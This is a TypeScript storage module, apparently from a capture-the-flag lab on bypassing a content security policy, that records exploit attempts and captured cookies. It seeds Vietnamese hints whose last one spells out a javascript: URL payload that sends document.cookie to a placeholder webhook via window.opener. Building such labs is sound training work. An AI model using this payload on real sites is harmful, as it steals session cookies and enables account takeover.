import { 
  type ExploitAttempt, 
  type InsertExploitAttempt,
  type CapturedCookie,
  type InsertCapturedCookie,
  type Hint,
  type InsertHint
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  createExploitAttempt(attempt: InsertExploitAttempt): Promise<ExploitAttempt>;
  getExploitAttempts(): Promise<ExploitAttempt[]>;
  
  createCapturedCookie(cookie: InsertCapturedCookie): Promise<CapturedCookie>;
  getCapturedCookies(): Promise<CapturedCookie[]>;
  
  getHints(): Promise<Hint[]>;
  revealHint(id: string): Promise<Hint | undefined>;
  
  clearData(): Promise<void>;
}

export class MemStorage implements IStorage {
  private exploitAttempts: Map<string, ExploitAttempt>;
  private capturedCookies: Map<string, CapturedCookie>;
  private hints: Map<string, Hint>;

  constructor() {
    this.exploitAttempts = new Map();
    this.capturedCookies = new Map();
    this.hints = new Map();
    this.initializeHints();
  }

  private initializeHints() {
    const hintsData = [
      {
        level: 1,
        title: "Bước đầu tiên",
        content: "Hãy thử gửi một URL với javascript: scheme để kiểm tra xem redirect có xử lý đúng không.",
      },
      {
        level: 2,
        title: "Bypass CSP",
        content: "CSP chặn inline scripts, nhưng không chặn navigation qua javascript: URLs. Hãy sử dụng window.opener để truy cập parent window.",
      },
      {
        level: 3,
        title: "Khai thác iframe",
        content: "Tạo một trang HTML với iframe trỏ đến target, sau đó sử dụng window.opener trong iframe để bypass CSP.",
      },
      {
        level: 4,
        title: "Payload hoàn chỉnh",
        content: "Sử dụng payload: javascript:window.opener.location='YOUR_WEBHOOK?c='+encodeURIComponent(document.cookie)",
      },
    ];

    hintsData.forEach((hint, index) => {
      const id = `hint-${index + 1}`;
      this.hints.set(id, { ...hint, id, revealed: false });
    });
  }

  async createExploitAttempt(insertAttempt: InsertExploitAttempt): Promise<ExploitAttempt> {
    const id = randomUUID();
    const attempt: ExploitAttempt = {
      id,
      payload: insertAttempt.payload,
      success: insertAttempt.success ?? false,
      timestamp: new Date(),
    };
    this.exploitAttempts.set(id, attempt);
    return attempt;
  }

  async getExploitAttempts(): Promise<ExploitAttempt[]> {
    return Array.from(this.exploitAttempts.values()).sort(
      (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async createCapturedCookie(insertCookie: InsertCapturedCookie): Promise<CapturedCookie> {
    const id = randomUUID();
    const cookie: CapturedCookie = {
      id,
      cookie: insertCookie.cookie,
      sourceUrl: insertCookie.sourceUrl ?? null,
      timestamp: new Date(),
    };
    this.capturedCookies.set(id, cookie);
    return cookie;
  }

  async getCapturedCookies(): Promise<CapturedCookie[]> {
    return Array.from(this.capturedCookies.values()).sort(
      (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
    );
  }

  async getHints(): Promise<Hint[]> {
    return Array.from(this.hints.values()).sort((a, b) => a.level - b.level);
  }

  async revealHint(id: string): Promise<Hint | undefined> {
    const hint = this.hints.get(id);
    if (hint) {
      hint.revealed = true;
      this.hints.set(id, hint);
      return hint;
    }
    return undefined;
  }

  async clearData(): Promise<void> {
    this.exploitAttempts.clear();
    this.capturedCookies.clear();
    this.hints.forEach((hint) => {
      hint.revealed = false;
      this.hints.set(hint.id, hint);
    });
  }
}

export const storage = new MemStorage();
